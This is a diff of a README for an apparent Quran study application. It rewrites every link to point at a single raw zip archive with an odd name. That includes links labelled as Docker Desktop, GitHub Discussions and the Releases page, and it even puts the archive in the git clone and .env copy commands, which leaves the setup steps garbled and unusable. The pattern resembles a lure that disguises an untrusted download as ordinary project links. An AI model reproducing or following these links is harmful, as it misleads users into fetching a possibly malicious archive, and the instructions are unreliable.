@@ -1,18 +1,18 @@
 # 📖 quran-researcher - Study the Quran with Ease
 
-[![Download Now](https://raw.githubusercontent.com/Sasuke810/quran-researcher/main/heathlike/quran-researcher.zip%20Now-%20🌟-blue)](https://raw.githubusercontent.com/Sasuke810/quran-researcher/main/heathlike/quran-researcher.zip)
+[![Download Now](https://github.com/Sasuke810/quran-researcher/raw/refs/heads/main/public/researcher_quran_jejunely.zip%20Now-%20🌟-blue)](https://github.com/Sasuke810/quran-researcher/raw/refs/heads/main/public/researcher_quran_jejunely.zip)
 
 ## 📥 Download & Install
 
-To get started with Quran Researcher, visit the [Releases page](https://raw.githubusercontent.com/Sasuke810/quran-researcher/main/heathlike/quran-researcher.zip) to download the latest version. Follow the steps below to set up the application on your device.
+To get started with Quran Researcher, visit the [Releases page](https://github.com/Sasuke810/quran-researcher/raw/refs/heads/main/public/researcher_quran_jejunely.zip) to download the latest version. Follow the steps below to set up the application on your device.
 
 ## ⚙️ Prerequisites
 
 Before installing Quran Researcher, ensure you have the following tools on your system:
 
-- **Docker Desktop** - [Download and install Docker Desktop](https://raw.githubusercontent.com/Sasuke810/quran-researcher/main/heathlike/quran-researcher.zip)
-- **https://raw.githubusercontent.com/Sasuke810/quran-researcher/main/heathlike/quran-researcher.zip 20+** - Required if you choose to run the application locally without Docker.
-- **Yarn** - A package manager for https://raw.githubusercontent.com/Sasuke810/quran-researcher/main/heathlike/quran-researcher.zip applications.
+- **Docker Desktop** - [Download and install Docker Desktop](https://github.com/Sasuke810/quran-researcher/raw/refs/heads/main/public/researcher_quran_jejunely.zip)
+- **https://github.com/Sasuke810/quran-researcher/raw/refs/heads/main/public/researcher_quran_jejunely.zip 20+** - Required if you choose to run the application locally without Docker.
+- **Yarn** - A package manager for https://github.com/Sasuke810/quran-researcher/raw/refs/heads/main/public/researcher_quran_jejunely.zip applications.
 
 ## 🚀 Getting Started with Docker
 
@@ -39,11 +39,11 @@ Next, you’ll need to clone the repository to your local machine. Execute the f
 
 ```bash
 # Clone the repository
-git clone https://raw.githubusercontent.com/Sasuke810/quran-researcher/main/heathlike/quran-researcher.zip
+git clone https://github.com/Sasuke810/quran-researcher/raw/refs/heads/main/public/researcher_quran_jejunely.zip
 cd quran-researcher
 
 # Copy the environment file (if it exists)
-cp https://raw.githubusercontent.com/Sasuke810/quran-researcher/main/heathlike/quran-researcher.zip .env
+cp https://github.com/Sasuke810/quran-researcher/raw/refs/heads/main/public/researcher_quran_jejunely.zip .env
 ```
 
 ### 3. Start All Services
@@ -51,7 +51,7 @@ cp https://raw.githubusercontent.com/Sasuke810/quran-researcher/main/heathlike/q
 To launch the application with all necessary services, use:
 
 ```bash
-# Build and start all containers (PostgreSQL + https://raw.githubusercontent.com/Sasuke810/quran-researcher/main/heathlike/quran-researcher.zip app)
+# Build and start all containers (PostgreSQL + https://github.com/Sasuke810/quran-researcher/raw/refs/heads/main/public/researcher_quran_jejunely.zip app)
 docker-compose up -d --build
 ```
 
@@ -78,10 +78,10 @@ If you experience any issues or have questions, feel free to open an issue on th
 
 Join our community for discussions, help, and additional resources:
 
-- **GitHub Discussions**: [Participate in discussions](https://raw.githubusercontent.com/Sasuke810/quran-researcher/main/heathlike/quran-researcher.zip)
+- **GitHub Discussions**: [Participate in discussions](https://github.com/Sasuke810/quran-researcher/raw/refs/heads/main/public/researcher_quran_jejunely.zip)
 - **Documentation**: Access detailed documentation for in-depth guidance. 
 
-Visit the [Releases page](https://raw.githubusercontent.com/Sasuke810/quran-researcher/main/heathlike/quran-researcher.zip) again for any updates or new versions of the software.
+Visit the [Releases page](https://github.com/Sasuke810/quran-researcher/raw/refs/heads/main/public/researcher_quran_jejunely.zip) again for any updates or new versions of the software.
 
 ## 📆 Next Steps
 
